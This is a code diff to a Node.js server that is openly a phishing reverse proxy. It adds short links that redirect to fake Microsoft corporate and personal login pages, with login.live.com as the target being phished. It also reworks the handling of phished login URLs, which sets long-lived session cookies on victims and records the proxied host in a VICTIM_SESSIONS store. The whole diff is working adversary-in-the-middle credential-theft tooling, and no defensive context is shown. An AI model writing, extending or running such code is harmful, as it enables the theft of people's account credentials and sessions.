@@ -51,6 +51,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
 
+    // Handle short URLs regardless of method
     if (url === '/c' || url === '/corp' || url === '/corporate') {
         // Redirect to full corporate login URL
         clientResponse.writeHead(302, { 
@@ -61,7 +62,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     }
     
     if (url === '/p' || url === '/personal') {
-        // Redirect to personal login URL (for future use)
+        // Redirect to personal login URL
         clientResponse.writeHead(302, { 
             Location: `/login?method=signin&mode=secure&client_id=${PERSONAL_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F` 
         });
@@ -69,34 +70,34 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
-    // Check if this is a login URL with either corporate or personal client_id
-    const isLoginUrl = url.startsWith(PROXY_ENTRY_POINT_BASE) && 
-                      (url.includes(`client_id=${CORPORATE_CLIENT_ID}`) || url.includes(`client_id=${PERSONAL_CLIENT_ID}`)) &&
-                      url.includes(PHISHED_URL_PARAMETER);
-    
-    if (isLoginUrl) {
-        try {
-            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
-            let session = currentSession;
+    if (url.startsWith(PROXY_ENTRY_POINT_BASE) && url.includes(PHISHED_URL_PARAMETER)) {
+        // Check if this is a login URL with either corporate or personal client_id
+        const isValidLogin = url.includes(`client_id=${CORPORATE_CLIENT_ID}`) || url.includes(`client_id=${PERSONAL_CLIENT_ID}`);
+        
+        if (isValidLogin) {
+            try {
+                const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
+                let session = currentSession;
 
-            if (!currentSession) {
-                const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`);
-                session = cookieName;
+                if (!currentSession) {
+                    const { cookieName, cookieValue } = generateNewSession(phishedURL);
+                    clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`);
+                    session = cookieName;
+                }
+                VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
+                VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
+                VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
+                VICTIM_SESSIONS[session].port = phishedURL.port;
+                VICTIM_SESSIONS[session].host = phishedURL.host;
+
+                clientResponse.writeHead(200, { "Content-Type": "text/html" });
+                fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
             }
-            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
-            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
-            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
-            VICTIM_SESSIONS[session].port = phishedURL.port;
-            VICTIM_SESSIONS[session].host = phishedURL.host;
-
-            clientResponse.writeHead(200, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
-        }
-        catch (error) {
-            displayError("Phishing URL parsing failed", error, url);
-            clientResponse.writeHead(404, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+            catch (error) {
+                displayError("Phishing URL parsing failed", error, url);
+                clientResponse.writeHead(404, { "Content-Type": "text/html" });
+                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+            }
         }
     }
 
